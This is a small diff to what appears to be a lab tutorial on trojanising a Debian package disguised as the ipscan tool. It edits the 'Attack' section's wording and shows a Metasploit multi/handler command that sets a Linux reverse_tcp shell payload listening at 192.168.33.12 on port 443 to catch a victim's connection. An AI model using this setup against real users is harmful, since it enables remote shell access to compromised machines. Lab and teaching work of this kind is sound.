@@ -84,7 +84,8 @@ We should rename `work.deb` to `ipscan_3.5.5_amd64.deb` and store it somewhere e
 
 # Attack
 We set up the Metasploit `multi/handler` to receive the incoming connection from a victim machine to the malicious server (`192.168.33.12`).
-This setup is done at the server side, which in our case is the same machine that package the malicious `dev` package:
+This setup is done at the server side, which in our case is the same machine that package the malicious `dev` package.
+Run the following command after `sudo su`:
 ```
 (root💀kali)-[/home/vagrant/Desktop/ipscan_trojan]
 └─# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.33.12; set LPORT 443; run; exit -y"
